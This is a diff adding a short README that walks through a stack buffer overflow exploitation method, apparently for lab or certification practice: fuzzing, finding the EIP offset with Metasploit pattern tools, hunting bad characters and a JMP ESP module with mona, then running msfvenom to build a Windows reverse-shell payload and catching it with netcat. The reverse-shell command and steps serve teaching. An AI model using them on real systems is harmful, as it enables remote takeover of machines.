@@ -1,0 +1,55 @@
+To exploit buffer overflow vulnerability we generally follow these steps:
+1. Fuzzing
+2. Finding the offset
+3. Overwriting the EIP
+4. Finding the bad characters
+5. Finding the right module
+6. Generate shellcode & root
+
+Here i've attached the skeleton scripts, modify according to the vulnerable application.
+
+Usage.
+
+1.
+
+Fuzz the vulnerable program & find the rounded num of bytes where it crashed
+
+2.
+
+Use metasploit module pattern-create to generate pattern.
+
+msf-pattern_create -l crashed_bytes
+
+fire up immunity debugger & run offset.py.
+copy EIP value & use pattern-offset to find the exact offset.
+
+msf-pattern_offset -l crashed_bytes -q EIP_VALUE
+
+3.
+
+Since we know offset, trying to overwrite the EIP with specific values to check if we can control EIP alone.
+
+4.
+
+set mona working folder - !mona config -set workingfolder c:\mona
+generate bytearray.bin file to compare in the future - !mona bytearray -cpb "\x00"
+Execute badchars.py & follow in the dump of ESP in immunity.
+comparing the bytearray file with ESP dump we can find badchars - !mona compare -f c:\mona\bytearray.bin -a ESP_ADDR
+
+5.
+
+Load mona modules - !mona modules
+find a module with most security features set to false.
+find the pointer to that module - !mona find -s "\xff\xe4" -m module.dll
+We need to try out the retn addresses one by one to see which one will work.
+In immunity set the breakpoint to the retn addrs selected
+run module.py & see if breakpoint is triggered.
+if not try another retn address.
+
+6.
+
+Generate msfvenom payload: msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+fire up the exploit & catch the reverse shell using netcat listener
+
+
+
